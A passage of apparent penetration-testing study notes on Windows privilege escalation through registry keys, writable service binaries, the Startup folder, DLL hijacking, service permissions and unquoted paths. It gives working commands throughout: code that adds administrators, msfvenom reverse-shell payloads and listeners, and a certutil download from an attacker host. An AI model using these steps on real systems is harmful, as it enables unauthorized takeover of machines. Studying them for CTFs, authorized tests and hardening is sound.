        ```bash
        Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
        ```
        
    - If the output shows **FullControl**, the current user can modify the key.

### **Escalation via Registry Key Exploitation:**

1. **Create a Malicious Executable:**
    - Compile a malicious C program designed to add a user to the administrators' group:
        
        ```c
        system("net localgroup administrators user /add");
        ```
        
2. **Compile the C Program:**
    - On your Kali machine, use **gcc** to compile the C program:
        
        ```bash
        x86_64-w64-mingw32-gcc windows_service.c -o x.exe
        ```
        
3. **Modify the Registry Key:**
    - Transfer the compiled `x.exe` to the Windows machine and modify the registry key to point to this executable:
        
        ```bash
        reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
        ```
        
4. **Start the Service:**
    - Start the service associated with the registry key:
        
        ```bash
        sc start regsvc
        ```
        
5. **Confirm Escalation:**
    - After running the malicious executable, check if the user was added to the **administrators** group:
        
        ```bash
        net localgroup administrators
        ```
        

---

### **Conclusion**

The combination of registry misconfigurations and autorun vulnerabilities provides several paths for privilege escalation in Windows systems. Attackers can replace autorun programs, exploit AlwaysInstallElevated settings, and manipulate registry keys to gain elevated access. Security teams should regularly audit registry settings, autorun programs, and user permissions to mitigate these risks.

# **Privilege Escalation Path: Executable Files**

### **Detection**

Privilege escalation through executable files often involves discovering vulnerable files that have misconfigured permissions, allowing unauthorized users to replace or manipulate them.

### **Using PowerUp**

1. **Run PowerUp Script:**
PowerUp is a PowerShell script designed to find common privilege escalation vulnerabilities. To use it:This command will run all checks and identify potential privilege escalation paths, including those involving executable files with weak permissions.
    
    ```bash
    . .\PowerUp.ps1
    Invoke-AllChecks
    ```
    

### **Manual Detection**

1. **Using AccessChk Tool:**
Another method is to manually check the permissions of specific files using the **AccessChk** tool. This tool reveals which users have what type of access to certain files.
    
    ```bash
    C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
    ```
    
    - In this case, you'll notice that the "Everyone" user group has **FILE_ALL_ACCESS** permission on the file `filepermservice.exe`. This means anyone can modify or replace this file, which is a critical security misconfiguration.

### **Escalation**

Once you've identified the vulnerable executable, you can exploit it by replacing it with a malicious file.

### **Steps for Exploitation:**

1. **Generate a Malicious File:**
First, create a malicious executable that will run commands with elevated privileges. This can be done using a C compiler like **Mingw**:
    
    ```bash
    x86_x64-w64-mingw32-gcc windows_service.c -o x.exe
    ```
    
    This will compile the C code into an executable file (`x.exe`).
    
2. **Replace the Vulnerable Executable:**
Once the malicious file (`x.exe`) is ready, replace the vulnerable executable (`filepermservice.exe`) in the target location:
    
    ```bash
    copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
    ```
    
3. **Start the Service:**
After replacing the file, restart the vulnerable service to execute the malicious code:
    
    ```bash
    sc start filepermsvc
    ```
    
4. **Check for Administrator Privileges:**
To confirm that the malicious file has escalated privileges, check if the current user was added to the **local administrators group**:
    
    ```bash
    net localgroup administrators
    ```
    
    If the user has been added, you now have administrative access, granting root-level control over the system.
    

### **Summary**

By exploiting misconfigured file permissions, such as the **FILE_ALL_ACCESS** permission on executables, attackers can replace legitimate system files with malicious versions. When the system executes these files (e.g., through a service restart), the attacker’s code runs with elevated privileges, leading to full system compromise.

# Escalation Path: Startup Application

### Overview

This escalation path uses the same concept as an **autorun attack**, where an application automatically starts up when a machine is booted. The idea is to exploit this feature by placing a malicious file in the startup folder to gain a reverse shell or escalate privileges.

Unlike other privilege escalation methods, **PowerUp** (a common privilege escalation tool in PowerShell) may not detect this vulnerability, so manual detection is required.

### Detection

To check if the **Startup** folder is vulnerable, you can use the following command in the command prompt or PowerShell:

```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

From the output, if you notice that the group `BUILTIN\Users` has **Full access** (`(F)`), this indicates that all users, including non-administrators, have full control over the files in this folder. This level of access allows them to modify or replace files, which creates a potential security risk.

- **F** = Full access (read, write, modify, execute)
- **M** = Modify access (read, write, modify)
- **RX** = Read and execute access
- **R** = Read-only access

### Escalation Process

1. **Setup Metasploit Listener**:
Start by opening Metasploit on your attacking machine (e.g., Kali Linux) and set up a listener using the **multi/handler** module to catch the reverse shell:
    
    ```bash
    msfconsole
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost <kali ip>
    set lport <port>
    exploit
    ```
    
2. **Generate the Exploit**:
Create a malicious executable using **msfvenom**. This payload will connect back to your listener when executed on the target machine.
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o y.exe
    ```
    
3. **Transfer the Exploit to the Target**:
You can transfer the malicious `y.exe` file to the target system using various methods like:
    - **FTP** server
    - **Python HTTP server**
    - Using `certutil` on Windows to download the file from your attacking machine:
        
        ```bash
        certutil -urlcache -split -f "http://<kali-ip>/y.exe" y.exe
        ```
        
4. **Save the Exploit in the Startup Folder**:
Once you have the exploit file on the target machine, place it in the **Startup** folder:
    
    ```bash
    copy /y y.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    ```
    
5. **Restart the Machine**:
Reboot the target machine. When the machine boots up, any executable in the Startup folder will automatically run. Since you've placed your malicious executable there, it will execute upon boot, giving you a reverse shell back to your Kali machine.
6. **Catch the Shell**:
After the reboot, your **msfconsole** listener will receive a connection from the target, and you'll gain a **Meterpreter shell** with the same privileges as the user that executed the startup file.

This technique is useful when non-admin users have write access to the **Startup** folder, allowing them to replace or add malicious executables that run automatically on system startup.

### Important Notes:

- This method relies on improper access controls for the **Startup** folder. Administrators should regularly audit permissions on critical directories like this to prevent exploitation.
- **Full access (F)** for non-administrative users on directories related to system functions, like Startup, poses significant security risks.

By exploiting this misconfiguration, an attacker can persist their access and potentially escalate their privileges further.

# Escalation Path: DLL Hijacking

### Overview of DLL Hijacking:

- **DLL** stands for Dynamic Link Library, which contains code and data used by multiple programs simultaneously.
- In a **DLL Hijacking** attack, the attacker exploits a missing or improperly loaded DLL by placing a malicious version in a writable directory.
- The key idea is to look for a **DLL** that the system tries to load but cannot find (resulting in a "NAME NOT FOUND" error). If the directory for that missing DLL is writable, an attacker can place a malicious DLL with the same name in that path.

### Escalation Process:

1. **Detect Missing DLLs with Process Monitor:**
    - Run **Process Monitor** and set filters to capture failed DLL loading attempts:
        - Filter by `Result` is "NAME NOT FOUND."
        - Filter by paths that end with `.dll`.
2. **Stop and Start the Target Service:**
    - Stop the vulnerable service:
        
        ```bash
        sc stop dllsvc
        ```
        
    - Start the vulnerable service again:
        
        ```bash
        sc start dllsvc
        ```
        
3. **Prepare the Malicious DLL:**
    - Obtain the `windows_dll.c` file and modify it to include a command to escalate privileges. For example, to add a user to the local administrators group:
        
        ```c
        system("cmd.exe /k net localgroup administrators userBatman /add");
        ```
        
4. **Compile the Malicious DLL:**
    - Compile the modified file into a DLL format:
        
        ```bash
        x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
        ```
        
5. **Send the Malicious DLL to the Target:**
    - Use a **Python server** to transfer the malicious DLL to the target machine.
    - Save the malicious DLL in a writable directory on the target machine, such as `C:\Temp\`.
6. **Replace the Missing DLL and Restart the Service:**
    - Once the DLL is in place, stop and start the service again to trigger the loading of your malicious DLL:
        
        ```bash
        sc stop dllsvc
        sc start dllsvc
        ```
        
    
    When the service starts, it will load the malicious DLL from the writable location, executing the embedded commands (in this case, adding the user `userBatman` to the local administrators group), leading to privilege escalation.
    

---

By exploiting DLL Hijacking, an attacker can gain elevated privileges or perform malicious actions by inserting their DLL into the system's loading process. This technique can be particularly effective if the vulnerable service runs with high privileges, like SYSTEM or administrator.

# **Escalation via Service Permissions**

This method takes advantage of improper service permissions, specifically when a service grants write access to unauthorized users, allowing modification of its configuration.

### Steps:

1. **Identify Vulnerable Services with PowerUp:**
    - Run PowerUp to automatically identify misconfigurations in service permissions.
        
        ```powershell
        powershell -ep bypass
        . .\PowerUp.ps1
        Invoke-AllChecks
        ```
        
2. **Manual Check with `accesschk`:**
    - Use `accesschk64.exe` to check for services with write access for unauthorized users.
        
        ```bash
        accesschk64.exe -uwcv Everyone *
        ```
        
    - Narrow down to a specific service (e.g., `daclsvc`):
        
        ```bash
        accesschk64.exe -uwcv daclsvc
        sc qc daclsvc
        ```
        
3. **Exploit the Service (If Vulnerable):**
    - If you have write access (`SERVICE_CHANGE_CONFIG`), modify the service configuration to run a command (e.g., adding a user to the Administrators group).
        
        ```bash
        sc config daclsvc binpath= "net localgroup administrators user /add"
        sc stop daclsvc
        sc start daclsvc
        ```
        
    - Check if the user was successfully added:
        
        ```bash
        net localgroup administrators
        ```
        

### 2. **Escalation via Unquoted Service Paths**

In this method, unquoted service paths that contain spaces are exploited. If a service path isn't enclosed in quotes, Windows may search for executables in unintended locations, potentially running malicious code.

### Steps:

1. **Identify Unquoted Service Paths:**
    - Use PowerUp to find unquoted service paths.
        
        ```powershell
        powershell -ep bypass
        . .\PowerUp.ps1
        Invoke-AllChecks
        ```
        
2. **Prepare a Malicious Payload:**
    - Generate a payload using `msfvenom` for Meterpreter or Netcat:
        - **For Meterpreter:**
            
            ```bash
            msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o common.exe
            ```
            
        - **For Netcat:**
            
            ```bash
            msfvenom -p windows/reverse_tcp lhost=<kali ip> -f exe -o common.exe
            ```
            
3. **Exploit the Unquoted Path:**
    - Place the malicious executable in a writable directory within the unquoted service path.
    - Start the vulnerable service:
        
        ```bash
        sc start unquotedsvc
        ```
        
    - If successful, you should receive a shell back (e.g., via a listener with `multi/handler` or `netcat`).

These techniques are common in privilege escalation scenarios for CTFs or penetration tests, where you gain elevated privileges on a Windows system by exploiting service misconfigurations.